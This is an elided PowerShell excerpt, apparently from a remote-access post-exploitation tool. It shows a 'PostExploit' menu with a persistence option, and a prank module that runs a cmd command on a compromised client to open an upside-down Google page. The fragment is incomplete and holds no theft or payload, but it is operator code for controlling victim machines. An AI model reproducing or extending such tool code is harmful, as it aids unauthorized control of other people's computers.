  ...
  If(-not ($WaitData))
  {
    ...
    If($Command -ieq "PostExploit" -or $Command -ieq "post")
    {
      ...
      If($choise -ieq "Persist" -or $choise -ieq "persistance")
      {
        ...
        write-host "   Remark: 'Stop-Process -Name wscript' after reciving connection on meterpeter." -ForegroundColor Yellow
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
      ...
      If($choise -ieq "GoogleX" -or $choise -ieq "googlex")
      {
        ...
        write-host "`n`n   Modules     Description                     Remark" -ForegroundColor green;
        write-host "   -------     -----------                     ------";
        write-host "   upsidedown  Open Google-UpSideDown          Client:User  - Privileges required";
        ...
        If($EasterEgg -ieq "upsidedown")
        {
           $cmdline = "https://elgoog.im/əๅɓoo⅁/"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
